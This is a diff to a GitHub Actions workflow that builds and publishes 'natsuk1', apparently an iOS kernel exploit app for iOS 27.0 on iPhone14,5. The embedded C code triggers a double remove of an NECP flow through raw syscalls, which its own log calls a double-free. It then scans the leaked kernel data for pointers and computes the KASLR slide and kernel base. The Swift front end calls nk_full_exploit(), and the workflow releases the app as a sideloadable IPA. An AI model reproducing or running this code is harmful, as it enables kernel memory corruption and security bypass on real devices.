@@ -153,10 +153,7 @@ jobs:
           #define LR(t, ...) lg(t, "> ", __VA_ARGS__)
 
           static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
-
-          static int is_user_va(uint64_t v) {
-              return v >= 0x100000000ULL && v < 0x800000000000ULL;
-          }
+          static int is_user_va(uint64_t v) { return v >= 0x100000000ULL && v < 0x800000000000ULL; }
 
           static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
 
@@ -228,64 +225,47 @@ jobs:
           static int step_copy_result(void) {
               nk_log("");
               LI("S1", "copy_result: add_client + add_flow + remove_flow x2 + copy_result");
-
               int fd = nfd();
               if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
-
-              uint8_t cu[16];
-              memset(cu, 0, sizeof(cu));
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               int r = nadd_client(fd, cu);
               LI("S1", "add_client=%d", r);
               if (r != 0) { close(fd); return -1; }
-
               uint8_t fu[16];
               r = nadd_flow(fd, cu, fu);
               LI("S1", "add_flow=%d", r);
               if (r != 0) { close(fd); return -1; }
-
               int r1 = nrm_flow(fd, fu);
               int r2 = nrm_flow(fd, fu);
-              LI("S1", "remove#1=%d remove#2=%d (double-free confirm)", r1, r2);
-
-              uint8_t buf[RESBUF];
-              memset(buf, 0, sizeof(buf));
+              LI("S1", "remove#1=%d remove#2=%d", r1, r2);
+              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
               int c = ncpy_result(fd, cu, buf, sizeof(buf));
               LI("S1", "copy_result=%d bytes", c);
               close(fd);
-
               if (c > 0) {
-                  LI("S1", "hexdump of returned kernel data:");
+                  LI("S1", "hexdump:");
                   hexdump("S1H", buf, c, 256);
-                  LI("S1", "scan for kptr (8-byte aligned):");
                   int nk = scan_kptr("S1K", buf, c);
                   LI("S1", "kptr count = %d", nk);
-                  if (nk == 0) {
-                      LR("S1", "no kernel pointers in returned buffer");
-                  }
+                  if (nk == 0) LR("S1", "no kernel pointers in returned buffer");
               }
               return c;
           }
 
           static int step_sysctl_arena(void) {
               nk_log("");
-              LI("S2", "sysctl_arena: add_client + op=0x0D, then classify result");
-
+              LI("S2", "sysctl_arena: add_client + op=0x0D");
               int fd = nfd();
               if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
-
-              uint8_t cu[16];
-              memset(cu, 0, sizeof(cu));
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               int r = nadd_client(fd, cu);
               LI("S2", "add_client=%d", r);
               if (r != 0) { close(fd); return -1; }
-
               uint64_t val = 0;
               int rc = nleak_kva(fd, &val);
               LI("S2", "op=0x0D rc=%d value=0x%llx", rc, (unsigned long long)val);
               close(fd);
-
               if (rc != 0) { LE("S2", "op failed rc=%d", rc); return -1; }
-
               if (is_kptr(val)) {
                   LO("S2", "kernel pointer: 0x%llx", (unsigned long long)val);
                   uint64_t slide = val - KBASE;
@@ -293,11 +273,10 @@ jobs:
                   LO("S2", "base  = 0x%llx", (unsigned long long)(KBASE + slide));
                   return 0;
               }
-
               if (is_user_va(val)) {
                   LW("S2", "value is user VA: 0x%llx", (unsigned long long)val);
-                  LR("S2", "op=0x0D maps arena into OUR address space, not leak");
-                  LR("S2", "attempting direct read of 128 bytes...");
+                  LR("S2", "arena mapped into our address space, not a leak");
+                  LR("S2", "reading 128 bytes...");
                   volatile uint8_t *p = (volatile uint8_t *)(uintptr_t)val;
                   uint8_t local[128];
                   for (int i = 0; i < 128; i++) local[i] = p[i];
@@ -307,32 +286,24 @@ jobs:
                   LI("S2", "kptr count in arena = %d", nk);
                   return 0;
               }
-
               LW("S2", "value out of known ranges: 0x%llx", (unsigned long long)val);
               return -1;
           }
 
-          static int step_copy_result_long(void) {
+          static int step_copy_result_op3(void) {
               nk_log("");
-              LI("S3", "copy_result with op=0x03 (KASLR leak attempt #2)");
-
+              LI("S3", "copy_result op=0x03 variant");
               int fd = nfd();
               if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
-
-              uint8_t cu[16];
-              memset(cu, 0, sizeof(cu));
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-
               uint8_t fu[16];
               if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
-
-              uint8_t buf[RESBUF];
-              memset(buf, 0, sizeof(buf));
+              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
               int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
               LI("S3", "op=0x03 returned %d bytes", c);
               close(fd);
-
               if (c > 0) {
                   hexdump("S3H", buf, c, 256);
                   int nk = scan_kptr("S3K", buf, c);
@@ -344,29 +315,19 @@ jobs:
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v3.8 — NECP recon (no false leads)");
+              nk_log("natsuk1 v3.9 — NECP recon");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
-              nk_log("Plan:");
-              nk_log("  S1: copy_result data dump + kptr scan");
-              nk_log("  S2: sysctl_arena op=0x0D — classify (kptr / user VA / other)");
-              nk_log("  S3: copy_result op=0x03 variant");
-              nk_log("");
-
               int fd = nfd();
               if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
               close(fd);
               LO("PRE", "necp_open OK");
-
               step_copy_result();
               step_sysctl_arena();
-              step_copy_result_long();
-
+              step_copy_result_op3();
               nk_log("");
-              nk_log("================================================================");
-              nk_log("done");
-              nk_log("================================================================");
+              nk_log("======== done ========");
               return 0;
           }
 
@@ -386,6 +347,265 @@ jobs:
               nk_log("[!] cancel requested");
           }
           EOF
+
+      - name: Write natsuk1.swift
+        run: |
+          cat > natsuk1/natsuk1.swift <<'EOF'
+          import SwiftUI
+          import UIKit
+          import Foundation
+
+          final class LockedBuffer: @unchecked Sendable {
+              nonisolated(unsafe) static let shared = LockedBuffer()
+              private let lock = NSLock()
+              private var value: String = ""
+              private init() {}
+              func append(_ s: String) {
+                  lock.lock(); value += s + "\n"
+                  if value.count > 10000 { value = String(value.suffix(6000)) }
+                  lock.unlock()
+              }
+              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
+              func clear() { lock.lock(); value = ""; lock.unlock() }
+          }
+
+          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
+              guard let line = line else { return }
+              var bytes: [UInt8] = []
+              var p = line
+              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
+              let _line = String(decoding: bytes, as: UTF8.self)
+              LockedBuffer.shared.append(_line)
+              CrashLog.shared.writeLine(_line)
+              AppState.shared.parseLogLine(_line)
+          }
+
+          private func osVersionString() -> String {
+              let v = ProcessInfo.processInfo.operatingSystemVersion
+              return "\(v.majorVersion).\(v.minorVersion)"
+          }
+          private func appVersionString() -> String {
+              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
+          }
+
+          @main
+          struct natsuk1App: App {
+              var body: some Scene { WindowGroup { RootView() } }
+          }
+
+          struct RootView: View {
+              @StateObject private var state = AppState.shared
+              @StateObject private var offsets = OffsetsStore.shared
+              @StateObject private var airlift = AirliftBridge.shared
+              @AppStorage("auto_run") private var auto_run = false
+              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
+              @AppStorage("keep_alive_location") private var keep_alive_location = false
+              @Environment(\.scenePhase) private var scenePhase
+
+              init() {
+                  UserDefaults.standard.register(defaults: [
+                      "auto_run": false, "keep_alive_audio": false,
+                      "keep_alive_location": false, "lang": "en"])
+              }
+
+              var body: some View {
+                  ContentView()
+                      .environmentObject(state)
+                      .environmentObject(offsets)
+                      .environmentObject(airlift)
+                      .onAppear {
+                          CrashLog.shared.install()
+                          if let prev = CrashLog.shared.recoverPreviousSession(), !prev.isEmpty {
+                              AppState.shared.previousCrash = prev
+                          }
+                          nk_set_log(cCallback)
+                          if state.log.isEmpty {
+                              state.append("[*] natsuk1 v\(appVersionString())")
+                              state.append("[*] iOS \(osVersionString()) / arm64e")
+                              state.append("")
+                          }
+                          if keep_alive_audio { KeepAlive.shared.startAudio() }
+                          if keep_alive_location { KeepAlive.shared.startLocation() }
+                          if auto_run {
+                              DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() }
+                          }
+                      }
+                      .onChange(of: keep_alive_audio) { _, v in
+                          if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() }
+                      }
+                      .onChange(of: keep_alive_location) { _, v in
+                          if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() }
+                      }
+                      .onChange(of: scenePhase) { _, phase in
+                          if phase == .background {
+                              CrashLog.shared.markCleanShutdown()
+                          }
+                      }
+              }
+          }
+
+          final class AppState: ObservableObject, @unchecked Sendable {
+              @Published var slide: String = "—"
+              @Published var base: String = "—"
+              @Published var previousCrash: String? = nil
+              @Published var showCrashLog: Bool = false
+
+              func parseLogLine(_ line: String) {
+                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
+                      if self.slide != v {
+                          DispatchQueue.main.async { self.slide = v }
+                      }
+                  }
+                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
+                      if self.base != v {
+                          DispatchQueue.main.async { self.base = v }
+                      }
+                  }
+              }
+
+              private static func extractHex(_ s: String, keys: [String]) -> String? {
+                  for k in keys {
+                      if let r = s.range(of: k) {
+                          var hex = ""
+                          for c in s[r.upperBound...] {
+                              if c.isHexDigit { hex.append(c) } else { break }
+                          }
+                          if !hex.isEmpty { return "0x" + hex }
+                      }
+                  }
+                  return nil
+              }
+              nonisolated(unsafe) static let shared = AppState()
+              enum Status {
+                  case idle, running, ok, failed
+                  var color: Color {
+                      switch self {
+                      case .idle: return .secondary
+                      case .running: return .orange
+                      case .ok: return .green
+                      case .failed: return .red
+                      }
+                  }
+              }
+              @Published var log: String = ""
+              @Published var status: Status = .idle
+              @Published var running: Bool = false
+              @Published var show_respring: Bool = false
+              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
+
+              private init() {
+                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
+                  startFlusher()
+              }
+              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
+
+              private func startFlusher() {
+                  Task { [weak self] in
+                      while !Task.isCancelled {
+                          try? await Task.sleep(for: .milliseconds(300))
+                          guard let self else { return }
+                          let chunk = LockedBuffer.shared.drain()
+                          guard !chunk.isEmpty else { continue }
+                          var newLog = self.log
+                          newLog += chunk
+                          if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
+                          self.log = newLog
+                      }
+                  }
+              }
+              func append(_ s: String) { LockedBuffer.shared.append(s) }
+              func run() {
+                  if running { return }
+                  running = true; status = .running
+                  Task.detached {
+                      _ = nk_full_exploit()
+                      await MainActor.run {
+                          AppState.shared.running = false
+                          AppState.shared.status = .ok
+                      }
+                  }
+              }
+              func necp_run() {
+                  if running { return }
+                  running = true; status = .running
+                  Task.detached {
+                      let rc = nk_necp_run()
+                      await MainActor.run {
+                          AppState.shared.running = false
+                          AppState.shared.status = (rc == 0) ? .ok : .failed
+                      }
+                  }
+              }
+              func respring() { show_respring = true }
+              func clear() { LockedBuffer.shared.clear(); log = "" }
+              func cancel() {
+                  nk_necp_cancel()
+                  append("[*] cancel requested")
+              }
+          }
+          EOF
+
+      - name: Write ContentView.swift
+        run: |
+          cat > natsuk1/Views/ContentView.swift <<'EOF'
+          import SwiftUI
+
+          struct ContentView: View {
+              @EnvironmentObject var state: AppState
+              var body: some View {
+                  TabView {
+                      OverviewView()
+                          .tabItem { Label(state.t("Overview", "Обзор"), systemImage: "square.grid.2x2") }
+                      ToolsView()
+                          .tabItem { Label(state.t("Tools", "Инструменты"), systemImage: "hammer") }
+                      SettingsView()
+                          .tabItem { Label(state.t("Settings", "Настройки"), systemImage: "gearshape.fill") }
+                  }
+                  .tint(.accentColor)
+                  .onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in
+                      state.show_respring = true
+                  }
+                  .overlay(
+                      RespringView()
+                          .opacity(state.show_respring ? 1 : 0)
+                          .allowsHitTesting(state.show_respring)
+                          .ignoresSafeArea()
+                  )
+              }
+          }
+          EOF
+
+      - name: Patch OverviewView scaleEffect
+        run: |
+          python3 - <<'PYEOF'
+          import sys
+          p = "natsuk1/Views/OverviewView.swift"
+          s = open(p).read()
+          old = 'if state.running { ProgressView().scaleEffect(0.8) }'
+          new = 'ProgressView().opacity(state.running ? 1 : 0)'
+          if old in s:
+              s = s.replace(old, new)
+              open(p, "w").write(s)
+              print("patched OverviewView")
+          else:
+              print("OverviewView scaleEffect not found (already patched?)")
+          PYEOF
+
+      - name: Patch AirliftView scaleEffect
+        run: |
+          python3 - <<'PYEOF'
+          p = "natsuk1/Views/AirliftView.swift"
+          s = open(p).read()
+          n = s.count(".scaleEffect(")
+          if n == 0:
+              print("AirliftView no scaleEffect to patch")
+              sys.exit(0)
+          import re
+          s = re.sub(r'\.scaleEffect\([^)]*\)', '', s)
+          open(p, "w").write(s)
+          print("patched AirliftView: removed %d scaleEffect" % n)
+          PYEOF
+        continue-on-error: true
 
       - name: Write offsets JSON
         run: |
@@ -514,21 +734,23 @@ jobs:
           chk() {
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
-
-          chk "nk_offsets.h exists"        "test -s natsuk1/Exploit/nk_offsets.h"
-          chk "necp.c exists"              "test -s natsuk1/Exploit/necp.c"
-          chk "offsets json exists"        "test -s natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
-          chk "no NEXTHINT"                "! test -f NEXTHINT.txt"
-          chk "NK_SYSENT_BASE defined"     "grep -q -e 'NK_SYSENT_BASE' natsuk1/Exploit/nk_offsets.h"
-          chk "NK_SYSENT_COUNT defined"    "grep -q -e 'NK_SYSENT_COUNT' natsuk1/Exploit/nk_offsets.h"
-          chk "step_copy_result in necp.c" "grep -q -e 'step_copy_result' natsuk1/Exploit/necp.c"
-          chk "step_sysctl_arena in necp.c" "grep -q -e 'step_sysctl_arena' natsuk1/Exploit/necp.c"
-          chk "hexdump in necp.c"          "grep -q -e 'hexdump' natsuk1/Exploit/necp.c"
-          chk "scan_kptr in necp.c"        "grep -q -e 'scan_kptr' natsuk1/Exploit/necp.c"
-
+          chk "nk_offsets.h"            "test -s natsuk1/Exploit/nk_offsets.h"
+          chk "necp.c"                  "test -s natsuk1/Exploit/necp.c"
+          chk "natsuk1.swift"           "test -s natsuk1/natsuk1.swift"
+          chk "ContentView.swift"       "test -s natsuk1/Views/ContentView.swift"
+          chk "offsets json"            "test -s natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
+          chk "no Group if/else"        "! grep -q -e 'if isSupportedIOS' natsuk1/natsuk1.swift"
+          chk "no NotSupportedView"     "! grep -q -e 'NotSupportedView' natsuk1/natsuk1.swift"
+          chk "no scaleEffect in Overview" "! grep -q -e 'scaleEffect' natsuk1/Views/OverviewView.swift"
+          chk "no scaleEffect in Airlift"  "! grep -q -e 'scaleEffect' natsuk1/Views/AirliftView.swift"
+          chk "NK_SYSENT_BASE"          "grep -q -e 'NK_SYSENT_BASE' natsuk1/Exploit/nk_offsets.h"
+          chk "NK_SYSENT_COUNT"         "grep -q -e 'NK_SYSENT_COUNT' natsuk1/Exploit/nk_offsets.h"
+          chk "step_copy_result"        "grep -q -e 'step_copy_result' natsuk1/Exploit/necp.c"
+          chk "step_sysctl_arena"       "grep -q -e 'step_sysctl_arena' natsuk1/Exploit/necp.c"
+          chk "hexdump"                 "grep -q -e 'hexdump' natsuk1/Exploit/necp.c"
+          chk "scan_kptr"               "grep -q -e 'scan_kptr' natsuk1/Exploit/necp.c"
           python3 -c "import json; json.load(open('natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json'))" || FAIL=1
           echo "  OK   json valid"
-
           if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
           echo "VERIFY OK"
 
@@ -563,17 +785,15 @@ jobs:
           COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
           rm -rf Payload
           if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
-
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
           ALTSTORE_URL="altstore://install?url=${IPA_URL}"
           SCARLET_URL="scarlet://install?url=${IPA_URL}"
           ESIGN_URL="esign://install?url=${IPA_URL}"
-
           NOTES="$(cat <<EOF
           ### natsuk1 — iOS 27.0 (24A437)
 
-          v3.8 — NECP recon.
+          v3.9 — flat view tree (LiveContainer crash fix).
 
           **IPA** \`${IPA_URL}\`
 
@@ -584,7 +804,6 @@ jobs:
           $(git log -5 --pretty=format:'- %h %s')
           EOF
           )"
-
           gh release create development natsuk1.ipa \
             --target "${{ github.sha }}" \
             --title "Development" \
@@ -599,5 +818,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add -A
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "NECP recon v3.8: hexdump + arena classification [skip ci]"
+          git commit -m "flat view tree: fix LiveContainer _ConditionalContent crash [skip ci]"
           git push
